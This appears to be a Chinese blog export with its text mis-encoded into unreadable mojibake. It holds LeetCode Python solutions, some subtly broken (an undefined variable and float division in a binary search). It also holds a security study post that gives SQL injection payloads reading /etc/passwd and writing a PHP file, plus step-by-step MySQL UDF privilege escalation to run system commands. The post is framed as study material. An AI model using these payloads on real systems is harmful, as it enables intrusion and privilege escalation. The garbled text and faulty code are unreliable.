end)ï¼šstarté»˜è®¤æ˜¯0ï¼Œè¿”å›start - (end-1)çš„è¿­ä»£å™¨ã€‚ #21 merge-two-sorted-lists åˆå¹¶ä¸¤ä¸ªæœ‰åºé“¾è¡¨ Question å°†ä¸¤ä¸ªæœ‰åºé“¾è¡¨åˆå¹¶ä¸ºä¸€ä¸ªæ–°çš„æœ‰åºé“¾è¡¨å¹¶è¿”å›ã€‚æ–°é“¾è¡¨æ˜¯é€šè¿‡æ‹¼æ¥ç»™å®šçš„ä¸¤ä¸ªé“¾è¡¨çš„æ‰€æœ‰èŠ‚ç‚¹ç»„æˆçš„ã€‚ Example ç¤ºä¾‹ 12è¾“å…¥ï¼š1-&gt;2-&gt;4, 1-&gt;3-&gt;4è¾“å‡ºï¼š1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4 Solution æ–¹æ³•ä¸€ æ€è·¯ è¦è€ƒè™‘åˆ°l1æˆ–l2ä¸ºNoneçš„æƒ…å†µä¸‹ï¼Œç›´æ¥è¿”å›éç©ºçš„é“¾è¡¨ã€‚ å°†ä¸¤ä¸ªé“¾è¡¨çš„å…ƒç´ ä¸­valåˆ†åˆ«å­˜å…¥ä¸¤ä¸ªåˆ—è¡¨ï¼Œæ‹¼æ¥è¿™ä¸¤ä¸ªåˆ—è¡¨åè¿›è¡Œæ’åºï¼ŒæŠŠæ’åºåçš„åˆ—è¡¨ä¸­çš„å…ƒç´ ç»„æˆä¸€ä¸ªæ–°çš„é“¾è¡¨ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142# Definition for singly-linked list.# class ListNode(object):# def __init__(self, x):# self.val = x# self.next = Noneclass Solution(object): def mergeTwoLists(self, l1, l2): &quot;&quot;&quot; :type l1: ListNode :type l2: ListNode :rtype: ListNode &quot;&quot;&quot; if l1 is None: return l2 if l2 is None: return l1 tmp1, tmp2 = [], [] while l1: tmp1.append(l1.val) l1 = l1.next while l2: tmp2.append(l2.val) l2 = l2.next l3 = sorted(tmp1 + tmp2) l = ListNode(l3[0]) l.next = None p = l for i in range(1, len(l3)): tmp = ListNode(l3[i]) tmp.next = None p.next = tmp p = tmp return l æ–¹æ³•äºŒ æ€è·¯ é¦–å…ˆï¼Œæˆ‘ä»¬è®¾å®šä¸€ä¸ªå“¨å…µèŠ‚ç‚¹ prehead ï¼Œè¿™å¯ä»¥åœ¨æœ€åè®©æˆ‘ä»¬æ¯”è¾ƒå®¹æ˜“åœ°è¿”å›åˆå¹¶åçš„é“¾è¡¨ã€‚æˆ‘ä»¬ç»´æŠ¤ä¸€ä¸ª prev æŒ‡é’ˆï¼Œæˆ‘ä»¬éœ€è¦åšçš„æ˜¯è°ƒæ•´å®ƒçš„ next æŒ‡é’ˆã€‚ç„¶åï¼Œæˆ‘ä»¬é‡å¤ä»¥ä¸‹è¿‡ç¨‹ï¼Œç›´åˆ° l1 æˆ–è€…l2æŒ‡å‘äº† null ï¼šå¦‚æœ l1 å½“å‰ä½ç½®çš„å€¼å°äºç­‰äº l2 ï¼Œæˆ‘ä»¬å°±æŠŠ l1 çš„å€¼æ¥åœ¨ prev èŠ‚ç‚¹çš„åé¢åŒæ—¶å°† l1 æŒ‡é’ˆå¾€åç§»ä¸€ä¸ªã€‚å¦åˆ™ï¼Œæˆ‘ä»¬å¯¹ l2 åšåŒæ ·çš„æ“ä½œã€‚ä¸ç®¡æˆ‘ä»¬å°†å“ªä¸€ä¸ªå…ƒç´ æ¥åœ¨äº†åé¢ï¼Œæˆ‘ä»¬éƒ½æŠŠprev å‘åç§»ä¸€ä¸ªå…ƒç´ ã€‚ åœ¨å¾ªç¯ç»ˆæ­¢çš„æ—¶å€™ï¼Œ l1 å’Œ l2 è‡³å¤šæœ‰ä¸€ä¸ªæ˜¯éç©ºçš„ã€‚ç”±äºè¾“å…¥çš„ä¸¤ä¸ªé“¾è¡¨éƒ½æ˜¯æœ‰åºçš„ï¼Œæ‰€ä»¥ä¸ç®¡å“ªä¸ªé“¾è¡¨æ˜¯éç©ºçš„ï¼Œå®ƒåŒ…å«çš„æ‰€æœ‰å…ƒç´ éƒ½æ¯”å‰é¢å·²ç»åˆå¹¶é“¾è¡¨ä¸­çš„æ‰€æœ‰å…ƒç´ éƒ½è¦å¤§ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬åªéœ€è¦ç®€å•åœ°å°†éç©ºé“¾è¡¨æ¥åœ¨åˆå¹¶é“¾è¡¨çš„åé¢ï¼Œå¹¶è¿”å›åˆå¹¶é“¾è¡¨ã€‚ 1234567891011121314151617181920212223242526272829# Definition for singly-linked list.# class ListNode(object):# def __init__(self, x):# self.val = x# self.next = Noneclass Solution(object): def mergeTwoLists(self, l1, l2): &quot;&quot;&quot; :type l1: ListNode :type l2: ListNode :rtype: ListNode &quot;&quot;&quot; prehead = ListNode(-1) prev = prehead while l1 and l2: if l1.val &lt;= l2.val: prev.next = l1 l1 = l1.next else: prev.next = l2 l2 = l2.next prev = prev.next prev.next = l1 if l1 is not None else l2 return prehead.next Extra è¿æ¥ä¸¤ä¸ªåˆ—è¡¨ï¼šlist1 + list2 sort()å’Œsorted()çš„åŒºåˆ« sortæ˜¯å®¹å™¨çš„å‡½æ•°ï¼šsort(cmp=None, key=None, reverse=False) sortedæ˜¯pythonçš„å†…å»ºå‡½æ•°ï¼šsorted(iterable, cmp=None, key=None, reverse=False) å³ï¼šsort æ˜¯åº”ç”¨åœ¨ list ä¸Šçš„æ–¹æ³•ï¼Œsorted å¯ä»¥å¯¹æ‰€æœ‰å¯è¿­ä»£çš„å¯¹è±¡è¿›è¡Œæ’åºæ“ä½œã€‚ å¯¹äºä¸€ä¸ªæ— åºçš„åˆ—è¡¨aï¼Œè°ƒç”¨a.sort()ï¼Œå¯¹aè¿›è¡Œæ’åºåè¿”å›aï¼Œsort()å‡½æ•°ä¿®æ”¹å¾…æ’åºçš„åˆ—è¡¨å†…å®¹ã€‚ è€Œå¯¹äºåŒæ ·ä¸€ä¸ªæ— åºçš„åˆ—è¡¨aï¼Œè°ƒç”¨sorted(a)ï¼Œå¯¹aè¿›è¡Œæ’åºåè¿”å›ä¸€ä¸ªæ–°çš„åˆ—è¡¨ï¼Œè€Œå¯¹aä¸äº§ç”Ÿå½±å“ã€‚ keyï¼šç”¨æ¥æŒ‡å®šä¸€ä¸ªå‡½æ•°ï¼Œæ­¤å‡½æ•°åœ¨æ¯æ¬¡å…ƒç´ æ¯”è¾ƒæ—¶è¢«è°ƒç”¨ï¼Œæ­¤å‡½æ•°ä»£è¡¨æ’åºçš„è§„åˆ™ï¼Œä¹Ÿå°±æ˜¯ä½ æŒ‰ç…§ä»€ä¹ˆè§„åˆ™å¯¹ä½ çš„åºåˆ—è¿›è¡Œæ’åºï¼› reverseï¼šæ˜¯ç”¨æ¥è¡¨æ˜æ˜¯å¦é€†åºï¼Œé»˜è®¤çš„Falseæƒ…å†µä¸‹æ˜¯æŒ‰ç…§å‡åºçš„è§„åˆ™è¿›è¡Œæ’åºçš„ï¼Œå½“reverse=Trueæ—¶ï¼Œä¾¿ä¼šæŒ‰ç…§é™åºè¿›è¡Œæ’åºã€‚ #26_remove-duplicates-from-sorted-array Question ç»™å®šä¸€ä¸ªæ’åºæ•°ç»„ï¼Œä½ éœ€è¦åœ¨åŸåœ°åˆ é™¤é‡å¤å‡ºç°çš„å…ƒç´ ï¼Œä½¿å¾—æ¯ä¸ªå…ƒç´ åªå‡ºç°ä¸€æ¬¡ï¼Œè¿”å›ç§»é™¤åæ•°ç»„çš„æ–°é•¿åº¦ã€‚ ä¸è¦ä½¿ç”¨é¢å¤–çš„æ•°ç»„ç©ºé—´ï¼Œä½ å¿…é¡»åœ¨åŸåœ°ä¿®æ”¹è¾“å…¥æ•°ç»„å¹¶åœ¨ä½¿ç”¨ O(1) é¢å¤–ç©ºé—´çš„æ¡ä»¶ä¸‹å®Œæˆã€‚ ä¸ºä»€ä¹ˆè¿”å›æ•°å€¼æ˜¯æ•´æ•°ï¼Œä½†è¾“å‡ºçš„ç­”æ¡ˆæ˜¯æ•°ç»„å‘¢? è¯·æ³¨æ„ï¼Œè¾“å…¥æ•°ç»„æ˜¯ä»¥â€œå¼•ç”¨â€æ–¹å¼ä¼ é€’çš„ï¼Œè¿™æ„å‘³ç€åœ¨å‡½æ•°é‡Œä¿®æ”¹è¾“å…¥æ•°ç»„å¯¹äºè°ƒç”¨è€…æ˜¯å¯è§çš„ã€‚ ä½ å¯ä»¥æƒ³è±¡å†…éƒ¨æ“ä½œå¦‚ä¸‹: 12345678&#x2F;&#x2F; nums æ˜¯ä»¥â€œå¼•ç”¨â€æ–¹å¼ä¼ é€’çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸å¯¹å®å‚åšä»»ä½•æ‹·è´int len &#x3D; removeDuplicates(nums);&#x2F;&#x2F; åœ¨å‡½æ•°é‡Œä¿®æ”¹è¾“å…¥æ•°ç»„å¯¹äºè°ƒç”¨è€…æ˜¯å¯è§çš„ã€‚&#x2F;&#x2F; æ ¹æ®ä½ çš„å‡½æ•°è¿”å›çš„é•¿åº¦, å®ƒä¼šæ‰“å°å‡ºæ•°ç»„ä¸­è¯¥é•¿åº¦èŒƒå›´å†…çš„æ‰€æœ‰å…ƒç´ ã€‚for (int i &#x3D; 0; i &lt; len; i++) &#123; print(nums[i]);&#125; Example ç¤ºä¾‹1 123456789ç»™å®šæ•°ç»„ nums &#x3D; [1,1,2], å‡½æ•°åº”è¯¥è¿”å›æ–°çš„é•¿åº¦ 2, å¹¶ä¸”åŸæ•°ç»„ nums çš„å‰ä¸¤ä¸ªå…ƒç´ è¢«ä¿®æ”¹ä¸º 1, 2ã€‚ ä½ ä¸éœ€è¦è€ƒè™‘æ•°ç»„ä¸­è¶…å‡ºæ–°é•¿åº¦åé¢çš„å…ƒç´ ã€‚æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰é“¾æ¥ï¼šhttps:&#x2F;&#x2F;leetcode-cn.com&#x2F;problems&#x2F;remove-duplicates-from-sorted-arrayè‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ ç¤ºä¾‹2 12345ç»™å®š nums &#x3D; [0,0,1,1,1,2,2,3,3,4],å‡½æ•°åº”è¯¥è¿”å›æ–°çš„é•¿åº¦ 5, å¹¶ä¸”åŸæ•°ç»„ nums çš„å‰äº”ä¸ªå…ƒç´ è¢«ä¿®æ”¹ä¸º 0, 1, 2, 3, 4ã€‚ä½ ä¸éœ€è¦è€ƒè™‘æ•°ç»„ä¸­è¶…å‡ºæ–°é•¿åº¦åé¢çš„å…ƒç´ ã€‚ Solution æ€è·¯ æˆ‘ä»¬å¯ä»¥æ”¾ç½®ä¸¤ä¸ªæŒ‡é’ˆiå’Œjï¼Œå…¶ä¸­iæ˜¯æ…¢æŒ‡é’ˆï¼Œè€Œjæ˜¯å¿«æŒ‡é’ˆã€‚åªè¦ nums[i] = nums[j]ï¼Œæˆ‘ä»¬å°±å¢åŠ jä»¥è·³è¿‡é‡å¤é¡¹ã€‚ å½“æˆ‘ä»¬é‡åˆ°nums[i] = nums[j]æ—¶ï¼Œè·³è¿‡é‡å¤é¡¹çš„è¿è¡Œå·²ç»ç»“æŸï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡»æŠŠå®ƒnums[j]çš„å€¼å¤åˆ¶åˆ° nums[i + 1]ã€‚ç„¶åé€’å¢iï¼Œæ¥ç€æˆ‘ä»¬å°†å†æ¬¡é‡å¤ç›¸åŒçš„è¿‡ç¨‹ï¼Œç›´åˆ°jåˆ°è¾¾æ•°ç»„çš„æœ«å°¾ä¸ºæ­¢ã€‚ 12345678910111213class Solution(object): def removeDuplicates(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; i = 0 for j in range(1, len(nums)): if nums[i] != nums[j]: i = i+1 nums[i] = nums[j] return i+1 #27_remove-element Question ç»™å®šä¸€ä¸ªæ•°ç»„ nums å’Œä¸€ä¸ªå€¼ valï¼Œä½ éœ€è¦åŸåœ°ç§»é™¤æ‰€æœ‰æ•°å€¼ç­‰äº val çš„å…ƒç´ ï¼Œè¿”å›ç§»é™¤åæ•°ç»„çš„æ–°é•¿åº¦ã€‚ ä¸è¦ä½¿ç”¨é¢å¤–çš„æ•°ç»„ç©ºé—´ï¼Œä½ å¿…é¡»åœ¨åŸåœ°ä¿®æ”¹è¾“å…¥æ•°ç»„å¹¶åœ¨ä½¿ç”¨ O(1) é¢å¤–ç©ºé—´çš„æ¡ä»¶ä¸‹å®Œæˆã€‚ å…ƒç´ çš„é¡ºåºå¯ä»¥æ”¹å˜ã€‚ä½ ä¸éœ€è¦è€ƒè™‘æ•°ç»„ä¸­è¶…å‡ºæ–°é•¿åº¦åé¢çš„å…ƒç´ ã€‚ Example ç¤ºä¾‹ä¸€ 12345ç»™å®š nums = [3,2,2,3], val = 3,å‡½æ•°åº”è¯¥è¿”å›æ–°çš„é•¿åº¦ 2, å¹¶ä¸” nums ä¸­çš„å‰ä¸¤ä¸ªå…ƒç´ å‡ä¸º 2ã€‚ä½ ä¸éœ€è¦è€ƒè™‘æ•°ç»„ä¸­è¶…å‡ºæ–°é•¿åº¦åé¢çš„å…ƒç´ ã€‚ ç¤ºä¾‹äºŒ 1234567ç»™å®š nums = [0,1,2,2,3,0,4,2], val = 2,å‡½æ•°åº”è¯¥è¿”å›æ–°çš„é•¿åº¦ 5, å¹¶ä¸” nums ä¸­çš„å‰äº”ä¸ªå…ƒç´ ä¸º 0, 1, 3, 0, 4ã€‚æ³¨æ„è¿™äº”ä¸ªå…ƒç´ å¯ä¸ºä»»æ„é¡ºåºã€‚ä½ ä¸éœ€è¦è€ƒè™‘æ•°ç»„ä¸­è¶…å‡ºæ–°é•¿åº¦åé¢çš„å…ƒç´ ã€‚ Solution æ–¹æ³•ä¸€ æ€è·¯ é¦–å…ˆéå†å¾ªç¯numsï¼Œå¹¶ä½¿ç”¨countæ¥è®¡æ•°æœ‰å¤šå°‘ä¸ªå¾…åˆ é™¤çš„å…ƒç´ ï¼› å†æ‰§è¡Œcountæ¬¡removeå‡½æ•°åˆ é™¤numsä¸­å€¼ä¸ºvalçš„å…ƒç´  1234567891011class Solution: def removeElement(self, nums: List[int], val: int) -&gt; int: count = 0 for i in range(len(nums)): if nums[i] == val: count = count+1 for j in range(count): nums.remove(val) return len(nums) æ–¹æ³•äºŒ æ€è·¯ è¿™é“é¢˜çš„æ€è·¯å’Œ åˆ é™¤æ’åºæ•°ç»„ä¸­çš„é‡å¤é¡¹è§£æ³•ç±»ä¼¼ 12345678910111213class Solution(object): def removeDuplicates(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; i = 0 for j in range(len(nums)): if nums[j] != val: nums[i] = nums[j] i = i+1 return i #28_implement-strstr Question å®ç° strStr() å‡½æ•°ã€‚ ç»™å®šä¸€ä¸ª haystack å­—ç¬¦ä¸²å’Œä¸€ä¸ª needle å­—ç¬¦ä¸²ï¼Œåœ¨ haystack å­—ç¬¦ä¸²ä¸­æ‰¾å‡º needle å­—ç¬¦ä¸²å‡ºç°çš„ç¬¬ä¸€ä¸ªä½ç½® (ä»0å¼€å§‹)ã€‚å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™è¿”å› -1ã€‚ è¯´æ˜: å½“ needle æ˜¯ç©ºå­—ç¬¦ä¸²æ—¶ï¼Œæˆ‘ä»¬åº”å½“è¿”å›ä»€ä¹ˆå€¼å‘¢ï¼Ÿè¿™æ˜¯ä¸€ä¸ªåœ¨é¢è¯•ä¸­å¾ˆå¥½çš„é—®é¢˜ã€‚ å¯¹äºæœ¬é¢˜è€Œè¨€ï¼Œå½“ needle æ˜¯ç©ºå­—ç¬¦ä¸²æ—¶æˆ‘ä»¬åº”å½“è¿”å› 0 ã€‚è¿™ä¸Cè¯­è¨€çš„ strstr() ä»¥åŠ Javaçš„ indexOf() å®šä¹‰ç›¸ç¬¦ã€‚ Example ç¤ºä¾‹ä¸€ 12è¾“å…¥: haystack &#x3D; &quot;hello&quot;, needle &#x3D; &quot;ll&quot;è¾“å‡º: 2 ç¤ºä¾‹äºŒ 12è¾“å…¥: haystack &#x3D; &quot;aaaaa&quot;, needle &#x3D; &quot;bba&quot;è¾“å‡º: -1 Solution æ–¹æ³•ä¸€ æ€è·¯ è‹¥needleä¸ºç©ºå­—ç¬¦ä¸²ï¼Œåˆ™è¿”å›0ï¼› è‹¥needleçš„é¦–å­—ç¬¦ä¸åœ¨haystackä¸­ï¼Œåˆ™è¿”å›-1ï¼› å¾ªç¯éå†haystackï¼Œæ‰¾åˆ°needleé¦–å­—ç¬¦åœ¨haystackçš„èµ·å§‹ä½ç½®ï¼Œå‘åæ¯”è¾ƒneedle_lené•¿åº¦çš„å­å­—ç¬¦ä¸²ã€‚ 1234567891011121314class Solution: def strStr(self, haystack: str, needle: str) -&gt; int: needle_len = len(needle) if needle_len == 0: return 0 char = needle[0] if char not in haystack: return -1 else: for i in range(len(haystack)): if char == haystack[i]: if haystack[i:(i+needle_len)] == needle: return i return -1 æ–¹æ³•äºŒ æ€è·¯ å’Œæ–¹æ³•ä¸€çš„æ€è·¯ç›¸ä¼¼ï¼Œåªæ˜¯ä»£ç å†™çš„æ›´ä¸ºç®€æ´ï¼Œä½†æ˜¯æ„Ÿè§‰æ›´ä¸ºæš´åŠ›ã€‚ 123456class Solution: def strStr(self, haystack: str, needle: str) -&gt; int: for i in range(len(haystack) - len(needle)+1): if haystack[i:i+len(needle)] == needle: return i return -1 #35_search_insert_position Question ç»™å®šä¸€ä¸ªæ’åºæ•°ç»„å’Œä¸€ä¸ªç›®æ ‡å€¼ï¼Œåœ¨æ•°ç»„ä¸­æ‰¾åˆ°ç›®æ ‡å€¼ï¼Œå¹¶è¿”å›å…¶ç´¢å¼•ã€‚å¦‚æœç›®æ ‡å€¼ä¸å­˜åœ¨äºæ•°ç»„ä¸­ï¼Œè¿”å›å®ƒå°†ä¼šè¢«æŒ‰é¡ºåºæ’å…¥çš„ä½ç½®ã€‚ ä½ å¯ä»¥å‡è®¾æ•°ç»„ä¸­æ— é‡å¤å…ƒç´ ã€‚ Example ç¤ºä¾‹ä¸€ 12è¾“å…¥: [1,3,5,6], 5è¾“å‡º: 2 ç¤ºä¾‹äºŒ 12è¾“å…¥: [1,3,5,6], 2è¾“å‡º: 1 ç¤ºä¾‹ä¸‰ 12è¾“å…¥: [1,3,5,6], 7è¾“å‡º: 4 Solution æ–¹æ³•ä¸€ æ€è·¯ å¦‚æœtargetåœ¨numsä¸­ï¼Œåˆ™ç›´æ¥è¿”å›ç´¢å¼•ï¼› å¦åˆ™å°†targetæ·»åŠ åœ¨numsåˆ—è¡¨åé¢ï¼Œå†å¯¹å…¶è¿›è¡Œæ’åºï¼Œæœ€åè¿”å›ç´¢å¼•ã€‚ 1234567class Solution: def searchInsert(self, nums: List[int], target: int) -&gt; int: if target in nums: return nums.index(target) nums.append(target) nums.sort() return nums.index(target) è¿™ç§æ–¹æ³•å…¶å®æ¯”è¾ƒå–å·§ï¼Œè€Œé¢˜ç›®çš„æ„å›¾æ˜¯æƒ³è¦è€ƒå¯ŸäºŒåˆ†æŸ¥æ‰¾ã€‚ æ–¹æ³•äºŒ æ€è·¯ äºŒåˆ†æ³•æŸ¥æ‰¾ 12345678910111213class Solution: def searchInsert(self, nums: List[int], target: int) -&gt; int: low = 0 high = len(nums) while low &lt; high: mid = low + (high - low)/2 if nums[mid] &gt; target: high = mid elif nums[mid] &lt; target: low = mid +1 else: return mid return low","tags":[{"name":"python","slug":"python","permalink":"http://ca0y1h.top/tags/python/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://ca0y1h.top/tags/Leetcode/"},{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"http://ca0y1h.top/tags/%E7%AE%97%E6%B3%95/"}],"categories":[{"name":"ç¼–ç¨‹","slug":"ç¼–ç¨‹","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"ç®—æ³•","slug":"ç¼–ç¨‹/ç®—æ³•","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/%E7%AE%97%E6%B3%95/"}]},{"title":"Webå®‰å…¨å­¦ä¹ ä¹‹æ•°æ®åº“ç³»ç»ŸåŠŸèƒ½ç›¸å…³å­¦ä¹ ","date":"2019-09-05T08:48:01.000Z","path":"Web_security/basic_learning/4.æ•°æ®åº“ç³»ç»ŸåŠŸèƒ½ç›¸å…³å­¦ä¹ /","text":"Webå®‰å…¨å­¦ä¹ ä¹‹æ•°æ®åº“ç³»ç»ŸåŠŸèƒ½ç›¸å…³å­¦ä¹  ä»»åŠ¡ç›®æ ‡ å­¦ä¹ æ•°æ®åº“è‡ªå¸¦å‡½æ•°çš„åŠŸèƒ½å’Œç”¨æ³•ï¼ˆæ€è€ƒåœ¨ä»€ä¹ˆæƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨ï¼‰ï¼› å°†æ‰€æœ‰æ¶‰åŠçš„å‡½æ•°è¿›è¡Œæµ‹è¯•å¹¶ä¸¾ä¾‹è¯´æ˜å…¶ç”¨æ³•ï¼› æ‰©å±•å­¦ä¹ ï¼šé’ˆå¯¹ä¸åŒæ•°æ®åº“æ„é€ æ‰€éœ€ç¯å¢ƒï¼Œå°è¯•æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ 0x01 MySQLå¸¸ç”¨å‡½æ•° åœ¨è¿›è¡Œsqlæ³¨å…¥è¿‡ç¨‹ä¸­ï¼Œä¼šä½¿ç”¨åˆ°mysqlä¸­çš„å†…ç½®å‡½æ•°ã€‚åœ¨å†…ç½®å‡½æ•°ä¸­ï¼Œåˆåˆ†ä¸ºè·å–ä¿¡æ¯çš„å‡½æ•°å’ŒåŠŸèƒ½å‡½æ•°ã€‚ ä¿¡æ¯å‡½æ•°æ˜¯ç”¨æ¥è·å–mysqlä¸­çš„æ•°æ®åº“çš„ä¿¡æ¯ï¼ŒåŠŸèƒ½å‡½æ•°å°±æ˜¯ä¼ ç»Ÿçš„å‡½æ•°ç”¨æ¥å®ŒæˆæŸé¡¹æ“ä½œã€‚ å¸¸ç”¨çš„ä¿¡æ¯å‡½æ•° database()ï¼šç”¨äºè·å–å½“å‰ä½¿ç”¨çš„æ•°æ®åº“ä¿¡æ¯ version()ï¼šè¿”å›æ•°æ®åº“çš„ç‰ˆæœ¬ user()ï¼šè¿”å›å½“å‰çš„ç”¨æˆ·ï¼ˆç­‰ä»·äºcurrent_userå‚æ•°ï¼‰ @@datadirï¼šè·å–æ•°æ®åº“çš„å­˜å‚¨ä½ç½® å¸¸è§çš„åŠŸèƒ½å‡½æ•° load_file()ï¼šä»è®¡ç®—æœºä¸­è½½å…¥æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶ä¸­çš„æ•°æ® 12select * from table union select 1, load_file(&#39;&#x2F;etc&#x2F;passwd&#39;), 3select * from table union select 1, load_file(0x2F6574632F706173737764), 3 #ä½¿ç”¨åå…­è¿›åˆ¶ç»•è¿‡å•å¼•å·é™åˆ¶ into_outfile()ï¼šå†™å…¥æ–‡ä»¶ï¼Œå‰ææ˜¯å…·æœ‰å†™å…¥æ¡ä»¶ 1select &#39;&lt;?php phpinfo(); ?&gt;&#39; into outfile &#39;&#x2F;tmp&#x2F;xxx.php&#39;; concat()ï¼šè¿”å›ä¸¤ä¸ªå‚æ•°ç›¸è¿æ¥äº§ç”Ÿçš„å­—ç¬¦ä¸²ã€‚å¦‚æœå…¶ä¸­ä¸€ä¸ªå‚æ•°ä¸ºNULLï¼Œåˆ™è¿”å›å€¼ä¸ºNULLã€‚ group_concat()ï¼šç”¨äºåˆå¹¶å¤šæ¡è®°å½•ä¸­çš„ç»“æœã€‚ç”¨æ³•å¦‚ä¸‹ï¼š è¿”å›çš„å°±æ˜¯usersè¡¨ä¸­æ‰€æœ‰çš„ç”¨æˆ·åï¼Œå¹¶ä¸”æ˜¯ä½œä¸ºä¸€æ¡è®°å½•è¿”å›ã€‚ substr()ï¼šç”¨äºæˆªæ–­å­—ç¬¦ä¸²ã€‚ç”¨æ³•ä¸ºï¼šsubstr(str, pos, length)ï¼Œæ³¨æ„posæ˜¯ä»1å¼€å§‹çš„ã€‚ ascii()ï¼šè¿”å›å­—ç¬¦æ‰€å¯¹åº”çš„asciiç ã€‚ 1select ascii(&#39;a&#39;); #è¿”å›97 length()ï¼šè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚ 1select length(&#39;123456&#39;) #è¿”å›6 if(exp1, exp2, exp3)ï¼šå¦‚æœexp1æ˜¯Trueï¼Œåˆ™è¿”å›exp2ï¼›å¦åˆ™è¿”å›exp3ã€‚å¦‚ï¼š 12select 1,2,if(1&#x3D;1,3,-1) #1,2,3select 1,2,if(1&#x3D;2,3,-1) #1,2,-1 ifnull(exp1, exp2)ï¼šå¦‚æœexp1æ˜¯Trueï¼Œåˆ™è¿”å›exp1ï¼›å¦åˆ™è¿”å›exp2ã€‚å¦‚ï¼š 1select ifnull(sleep(2), 2); nullif(exp1, exp2)ï¼šå¦‚æœexp1==exp2ï¼Œåˆ™è¿”å›Nullï¼›å¦åˆ™è¿”å›exp2ã€‚ ä»¥ä¸Šå°±æ˜¯åœ¨è¿›è¡Œsqlæ³¨å…¥å·¥ç¨‹ä¸­å¸¸ç”¨çš„å‡½æ•°ã€‚å½“ç„¶è¿˜å­˜åœ¨ä¸€äº›ä½¿ç”¨çš„ä¸æ˜¯å¾ˆå¤šçš„å‡½æ•°ã€‚ 0x02 Linux MySQL UDFææƒ Step1 è·å–UDFæ–‡ä»¶ æŸ¥çœ‹MySQLç‰ˆæœ¬ 1select version(); Mysqlç‰ˆæœ¬å¤§äº5.1ç‰ˆæœ¬udf.dllæ–‡ä»¶å¿…é¡»æ”¾ç½®äºMYSQLå®‰è£…ç›®å½•ä¸‹çš„lib\\pluginæ–‡ä»¶å¤¹ä¸‹ æŸ¥æ‰¾Pluginç›®å½• 1select @@plugin_dir; æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ 12show variables like &#39;%compile%&#39;; åœ¨Kali Linuxä¸­æ‰¾åˆ°åˆé€‚çš„UDF æ³¨ï¼šæ–°ç‰ˆsqlmap ä¸ºäº†é˜²æ­¢æ–‡ä»¶è¢«è¯¯æ€ï¼Œå¯¹æ–‡ä»¶è¿›è¡Œå¼‚æˆ–åŠ å¯†ï¼Œéœ€è¦ä½¿ç”¨/usr/share/sqlmap/extra/cloak/è·¯å¾„ä¸‹çš„cloak.pyè§£å¯†è„šæœ¬å¯¹lib_mysqludf_sys.so_è¿›è¡Œè§£ç ï¼Œå³python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_å¾—åˆ°lib_mysqludf_sys.soæ–‡ä»¶ Step2 ä¸Šä¼ UDFæ–‡ä»¶ é¦–å…ˆç¡®ä¿MySQLå…è®¸å¯¹ä»»æ„è·¯å¾„è¿›è¡Œè¯»å†™æ“ä½œï¼Œå³secure_file_priv = å°†lib_mysqludf_sys.soä¼ è‡³/tmp/è·¯å¾„ä¸‹ï¼Œä½¿ç”¨load_file()å¯¹å…¶è¯»å–ï¼Œå¹¶è½¬æ¢æˆåå…­è¿›åˆ¶æ–‡ä»¶åå†å†™å…¥/tmp/ç›®å½•ä¸‹ï¼š 12select hex(load_file(&#39;&#x2F;tmp&#x2F;lib_mysqludf_sys.so&#39;)) into dumpfile &#39;&#x2F;tmp&#x2F;udf.hex&#39; è¯»å–udf.hexæ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶ä¸Šä¼ è‡³/usr/bin/mysql/plugin/ï¼š 12select 0x[udf.hexå†…å®¹] into dumpfile &#39;&#x2F;usr&#x2F;bin&#x2F;mysql&#x2F;plugin&#x2F;udf.so&#39; Step3 æ‰§è¡Œå‘½ä»¤ å®‰è£…UDF 12create function sys_eval returns string sonme &#39;udf.so&#39;; æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ 0x03 è¸©è¿‡çš„å‘ åœ¨è®¾ç½® secure_file_privilege='' ä¸”ç›®å½•æƒé™ä¸º 777 åload_file() æ— æ³•è¯»å–æ–‡ä»¶ã€‚ æ£€æŸ¥Apparmoré…ç½® æ£€æŸ¥æ–‡ä»¶çš„ç”¨æˆ·ç»„æ˜¯å¦æ˜¯å±äºmysql æ— æ³•ä¸Šä¼ udf.soè‡³/usr/bin/mysql/plugin/ç›®å½•ã€‚ æ£€æŸ¥è¯¥ç›®å½•çš„å…¶ä»–ç»„ç”¨æˆ·å—å¦æœ‰è¯»å†™æƒé™ æ£€æŸ¥æ–‡ä»¶çš„ç”¨æˆ·ç»„æ˜¯å¦æ˜¯å±äºmysql ä¸Šä¼ udf.soè‡³æŒ‡å®šç›®å½•åï¼Œcreate functionå¤±è´¥ã€‚ UDFä½¿ç”¨çš„ç‰ˆæœ¬å’Œæœ¬æœºç¯å¢ƒä¸åŒ¹é… æ²¡æœ‰å¯¹sqlmapä¸­çš„UDFæ–‡ä»¶è¿›è¡Œè§£ç æ“ä½œ ä½¿ç”¨select sys_eval();æ‰§è¡Œå‘½ä»¤è¿”å›NULLã€‚ å–æ¶ˆApparmorå¯¹mysqld serviceçš„é™åˆ¶ ç®€å•æ¥è¯´å°±æ˜¯æ‰§è¡Œä¸‹é¢ä¸¤ä¸ªå‘½ä»¤ï¼š 123sudo ln -s /etc/apparmor.d/usr.sbin.mysqld 